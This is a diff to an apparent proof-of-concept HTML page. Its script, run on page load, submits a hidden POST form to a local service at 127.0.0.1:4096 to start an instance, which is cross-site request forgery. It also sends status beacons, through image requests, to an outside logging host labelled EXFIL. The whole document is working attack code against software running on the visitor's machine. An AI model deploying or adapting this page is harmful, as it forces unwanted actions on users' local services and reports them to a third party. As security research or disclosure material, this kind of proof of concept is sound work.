@@ -2,17 +2,30 @@
 <meta charset="utf-8">
 <script>
 const EXFIL = 'https://122222.free.beeceptor.com';
+function log(s){ new Image().src = EXFIL + '/?s=' + encodeURIComponent(s) + '&t=' + Date.now(); }
 
-function log(x) {
-  new Image().src = EXFIL + '/?s=' + encodeURIComponent(x) + '&t=' + Date.now();
-}
+window.onload = () => {
+  log('start');
 
-log('start');
+  const f1 = document.createElement('iframe');
+  f1.name = 'x';
+  f1.style.display = 'none';
+  document.body.appendChild(f1);
 
-const f = document.createElement('iframe');
-f.style.display = 'none';
-f.onload = () => log('iframe-onload');
-f.onerror = () => log('iframe-error');
-f.src = 'http://127.0.0.1:4096/docs';
-document.body.appendChild(f);
+  const form = document.createElement('form');
+  form.method = 'POST';
+  form.action = 'http://127.0.0.1:4096/api/instance/start';
+  form.target = 'x';
+  form.style.display = 'none';
+  document.body.appendChild(form);
+  form.submit();
+  log('csrf-start-sent');
+
+  const f2 = document.createElement('iframe');
+  f2.style.display = 'none';
+  f2.onload = () => log('root-onload');
+  f2.onerror = () => log('root-onerror');
+  f2.src = 'http://127.0.0.1:4096/';
+  document.body.appendChild(f2);
+};
 </script>
